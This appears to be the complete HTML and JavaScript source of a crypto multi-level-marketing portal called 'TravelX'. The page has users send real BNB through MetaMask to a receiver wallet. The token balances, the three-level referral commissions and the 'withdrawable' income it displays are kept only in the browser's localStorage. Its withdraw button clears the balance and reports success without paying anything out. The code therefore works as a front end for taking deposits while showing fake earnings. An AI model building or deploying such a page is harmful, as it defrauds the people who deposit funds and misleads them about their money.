<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>TravelX | Web3 MLM Portal</title>

<script src="https://cdn.tailwindcss.com"></script>
<script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>

<style>
body{background:#060b14;}
.glass{background:rgba(17,24,39,0.7);backdrop-filter:blur(10px);}
</style>
</head>

<body class="text-white p-6">

<div class="max-w-5xl mx-auto">

<!-- HEADER -->
<div class="flex justify-between items-center mb-6">
<h1 class="text-2xl font-bold text-emerald-400">TRAVELX</h1>
<button onclick="connect()" class="bg-emerald-400 text-black px-4 py-2 rounded-xl font-bold">
Connect Wallet
</button>
</div>

<!-- STATS -->
<div class="grid md:grid-cols-3 gap-4">

<div class="glass p-4 rounded-xl">
BNB: <span id="bnb">0</span>
</div>

<div class="glass p-4 rounded-xl">
TVX: <span id="tvx">0</span>
</div>

<div class="glass p-4 rounded-xl">
Income: <span id="income">0</span>
</div>

</div>

<!-- BUY -->
<div class="glass p-6 mt-6 rounded-xl">
<h2 class="font-bold mb-2">Buy TVX</h2>

<input id="bnbInput" type="number"
class="w-full p-3 bg-black/40 rounded-xl"
placeholder="Enter BNB">

<p class="text-sm mt-2 text-gray-400">
You get: <span id="preview" class="text-emerald-400">0 TVX</span>
</p>

<button onclick="buy()" class="w-full bg-yellow-400 text-black py-3 rounded-xl mt-3 font-bold">
BUY
</button>
</div>

<!-- ACTIVATE -->
<div class="glass p-6 mt-6 rounded-xl">
<h2 class="font-bold">Activation (100$ TVX)</h2>
<button onclick="activate()" class="w-full bg-emerald-400 text-black py-3 rounded-xl font-bold mt-3">
Activate Card
</button>
</div>

<!-- WITHDRAW -->
<div class="glass p-6 mt-6 rounded-xl flex justify-between items-center">
<div>
<p class="text-gray-400">Withdrawable BNB</p>
<h2 class="text-3xl text-emerald-400 font-bold">$<span id="bal">0</span></h2>
</div>

<button onclick="withdraw()" class="bg-white text-black px-6 py-3 rounded-xl font-bold">
Withdraw
</button>
</div>

</div>

<script>

const RECEIVER="YOUR_WALLET_ADDRESS";
const RATE=10000;
const TVX_USD=0.01;

let account,provider,signer;
let BNB_USD=600;

// DB
const db=()=>JSON.parse(localStorage.getItem("travelx_db_v2")||"{}");
const save=d=>localStorage.setItem("travelx_db_v2",JSON.stringify(d));

// REGISTER
function register(a){
let d=db();
if(!d[a]){
d[a]={sponsor:null,tvx:0,bnb:0,active:false};
save(d);
}
}

// CONNECT
async function connect(){
if(!window.ethereum) return Swal.fire("Error","Install MetaMask","error");

let acc=await window.ethereum.request({method:"eth_requestAccounts"});
account=acc[0].toLowerCase();

provider=new ethers.providers.Web3Provider(window.ethereum);
signer=provider.getSigner();

register(account);

update();
setInterval(update,8000);
}

// BUY
async function buy(){
let bnb=document.getElementById("bnbInput").value;
if(!bnb) return;

let tx=await signer.sendTransaction({
to:RECEIVER,
value:ethers.utils.parseEther(bnb)
});

await tx.wait();

let d=db();
let tvx=bnb*RATE;

d[account].tvx+=tvx;

// MLM 5-3-2
let sponsor=d[account].sponsor;

for(let i=1;i<=3;i++){
if(!sponsor||!d[sponsor]) break;

let rate=(i===1?0.05:i===2?0.03:0.02);

// 50% TVX
d[sponsor].tvx += tvx*0.5*rate;

// 50% BNB (internal)
d[sponsor].bnb += (tvx*0.5*rate)*TVX_USD/BNB_USD;

sponsor=d[sponsor].sponsor;
}

save(d);

Swal.fire("Success","TVX Purchased","success");
update();
}

// PREVIEW
document.getElementById("bnbInput").oninput=(e)=>{
document.getElementById("preview").innerText=
(e.target.value*RATE)+" TVX";
}

// ACTIVATE
function activate(){
let d=db();

if(!d[account] || d[account].tvx < 100/TVX_USD){
return Swal.fire("Error","Need $100 TVX (10,000 TVX)","error");
}

d[account].active=true;
save(d);

Swal.fire("Success","Card Activated","success");
}

// WITHDRAW
function withdraw(){
let d=db();

if(!d[account] || d[account].bnb<=0)
return Swal.fire("Empty","No balance","info");

let amt=d[account].bnb;
d[account].bnb=0;

save(d);

document.getElementById("bal").innerText=amt;

Swal.fire("Success","Withdraw Requested","success");
}

// UPDATE
function update(){
let d=db();
let u=d[account];
if(!u) return;

document.getElementById("tvx").innerText=u.tvx.toLocaleString();
document.getElementById("income").innerText=u.bnb.toFixed(6);
document.getElementById("bal").innerText=(u.bnb*BNB_USD).toFixed(2);
}

</script>

</body>
</html>
